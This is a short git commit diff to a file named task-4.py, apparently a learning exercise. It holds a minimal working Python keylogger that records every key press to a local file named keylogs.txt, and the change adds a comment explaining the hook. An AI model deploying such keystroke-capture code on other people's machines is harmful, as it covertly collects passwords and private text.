b0200cbc5800d0cc38e33918887c96439fd4ba34
annie-81 <163000956+annie-81@users.noreply.github.com>
2024-05-01 23:37:42 +0530

    Update task-4.py

--- task-4.py
+++ task-4.py
@@ -3,5 +3,5 @@ file = 'keylogs.txt'
 def key_press(event):
     with open(file, 'a') as f:
         f.write('{}\n'.format(event.name))
-keyboard.on_press(key_press)
+keyboard.on_press(key_press) #the ‘key_press’ function is called whenever a key is pressed. This will enable our code to capture the keystrokes.
 keyboard.wait()
